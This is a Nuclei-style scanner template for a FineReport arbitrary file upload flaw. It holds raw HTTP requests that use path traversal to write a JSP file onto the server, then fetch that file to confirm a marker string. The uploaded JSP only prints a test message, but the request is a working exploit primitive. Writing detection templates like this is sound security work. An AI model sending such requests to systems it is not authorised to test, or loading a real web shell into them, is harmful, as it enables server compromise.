id: finereport-arbitrary-file-upload
info:
  name: FineReport Arbitrary File Upload
  author: ProjectDiscoveryAI
  severity: high
  tags: fileupload
http:
  - raw:
      - |
        POST /WebReport/ReportServer?op=svginit&cmd=design_save_svg&filePath=chartmapsvg/../../../../WebReport/update.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
        Content-Type: text/xml;

        {"__CONTENT__":"<%out.println(\"just_for_my_test_hahahhaha!\");%>","__CHARSET__":"UTF-8"}
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
  - raw:
      - |
        GET /WebReport/update.jsp HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36
    matchers-condition: and
    matchers:
      - type: word
        words:
          - "just_for_my_test_hahahhaha"
        part: body
      - type: status
        status:
          - 200
